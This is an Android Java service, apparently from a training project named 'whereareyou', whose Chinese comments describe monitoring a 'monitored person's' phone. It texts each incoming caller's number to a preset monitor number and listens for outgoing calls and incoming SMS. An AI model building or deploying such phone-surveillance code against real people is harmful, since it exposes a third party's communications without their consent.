package cn.tedu.whereareyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

//本类用来完成所选监控功能的开启或者关闭操作
public class WayService extends Service {
	//定义监控功能所需的资源对象
	PhoneStateListener psl;
	TelephonyManager tm;
	ToPhoneListenerReceiver tplr;
	IntentFilter tplif;
	MessageListenerReceiver mlr;
	IntentFilter mlif;
	//初始化所选监控功能资源对象
	public void onCreate(){
		super.onCreate();
		Toast.makeText(WayService.this,"正在初始化所选监控功能...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			psl = new PhoneStateListener(){
				@Override
				public void onCallStateChanged(int state, String incomingNumber) {
					// TODO Auto-generated method stub
					super.onCallStateChanged(state, incomingNumber);
					//判断：如果被监控者手机响铃，说明来电，需要开始准备进行来电监控操作
					if(state==TelephonyManager.CALL_STATE_RINGING){
						//判断：如果来电号码不是监控者，才进行来电监控
						if(!incomingNumber.endsWith(WayInformations.LPPN)){
							//向监控者发送监控短信
							//获得短信管理器对象
							SmsManager sm = SmsManager.getDefault();
							//准备内容（去信号码+去信内容）
							String message = incomingNumber + "is Called Phone to TA";
							//发送短信
							sm.sendTextMessage(WayInformations.LPPN, null, message, null, null);
						}
						
					}
				}
			};
			tm = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		}
		if(WayInformations.isQPL){
			tplr =new ToPhoneListenerReceiver();
			tplif = new IntentFilter();
		}
		if(WayInformations.isMSG){
			mlr = new MessageListenerReceiver();
			mlif = new IntentFilter();
		}
	}
	//开启所选监控功能（执行完startActivity(it);命令后会自动调用执行）
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Toast.makeText(WayService.this,"正在开启所选监控功能...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			tm.listen(psl, PhoneStateListener.LISTEN_CALL_STATE);
		}
		if(WayInformations.isQPL){
			tplif.addAction("android.intent.action.NEW_OUTGOING_CALL");
			this.registerReceiver(tplr, tplif);
		}
		if(WayInformations.isMSG){
			mlif.addAction("android.provider.Telephony.SMS_RECEIVED");
			this.registerReceiver(mlr, mlif);
		}
		return super.onStartCommand(intent, flags, startId);
	}
	//关闭所选监控功能（执行完stopActivity(it);命令后会自动调用执行）
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		Toast.makeText(WayService.this,"正在关闭所选监控功能...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			tm.listen(psl, PhoneStateListener.LISTEN_NONE);
			WayInformations.isFPL = false;
		}
		if(WayInformations.isQPL){
			this.unregisterReceiver(tplr);
			WayInformations.isQPL = false;
		}
		if(WayInformations.isMSG){
			this.unregisterReceiver(mlr);
			WayInformations.isMSG = false;
		}
	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
